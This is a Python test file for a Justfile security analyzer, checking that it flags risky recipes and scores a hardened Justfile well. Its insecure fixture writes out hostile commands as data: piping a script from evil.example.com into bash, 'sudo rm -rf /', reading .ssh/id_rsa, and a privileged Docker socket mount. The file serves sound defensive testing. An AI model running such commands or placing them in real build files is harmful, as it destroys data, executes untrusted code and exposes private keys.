"""Tests for JustfileAnalyzer."""

from pathlib import Path

from devai.justfile_analyzer import JustfileAnalyzer, JustfileFinding


INSECURE_JUSTFILE = """
export API_KEY := "supersecret-api-key-12345"
DATABASE_PASSWORD := "hardcoded-password"

[dotenv-load]

default:
    curl -fsSL http://evil.example.com/install.sh | bash
    sudo rm -rf /
    docker run --privileged -v /var/run/docker.sock:/var/run/docker.sock app
    curl -k https://example.com/data
    cat .ssh/id_rsa
    echo {{justfile_directory}}
"""

HARDENED_JUSTFILE = """
set shell := ["bash", "-eu", "-o", "pipefail", "-c"]

default:
    @just --list

test:
    python -m pytest
"""


class TestJustfileAnalyzer:
    def test_no_justfiles_returns_perfect_score(self, tmp_path: Path):
        (tmp_path / "app.py").write_text("x = 1\n", encoding="utf-8")
        analyzer = JustfileAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 0
        assert analyzer.health_score() == 100.0
        assert "none found" in analyzer.summary()

    def test_detects_insecure_patterns(self, tmp_path: Path):
        (tmp_path / "Justfile").write_text(INSECURE_JUSTFILE, encoding="utf-8")
        analyzer = JustfileAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "curl_pipe_shell" in kinds
        assert "sensitive_path" in kinds
        assert "privileged_docker" in kinds
        assert "insecure_http" in kinds
        assert "dotenv_load" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_justfile_scores_well(self, tmp_path: Path):
        (tmp_path / "justfile").write_text(HARDENED_JUSTFILE, encoding="utf-8")
        analyzer = JustfileAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert not any(f.severity == "high" for f in findings)
        assert analyzer.stats.configs == 1
        assert "test" in analyzer.infos[0].recipes

    def test_summary_context_and_template(self, tmp_path: Path):
        (tmp_path / "Justfile").write_text(HARDENED_JUSTFILE, encoding="utf-8")
        analyzer = JustfileAnalyzer(str(tmp_path))
        assert "Justfiles:" in analyzer.summary()
        assert "Justfile analysis" in analyzer.to_context()
        config = analyzer.generate_hardened_config()
        assert "set shell" in config

    def test_finding_format(self):
        finding = JustfileFinding(
            kind="curl_pipe_shell",
            severity="high",
            message="unsafe",
            path="Justfile",
            lineno=2,
        )
        assert "Justfile:2" in finding.format()
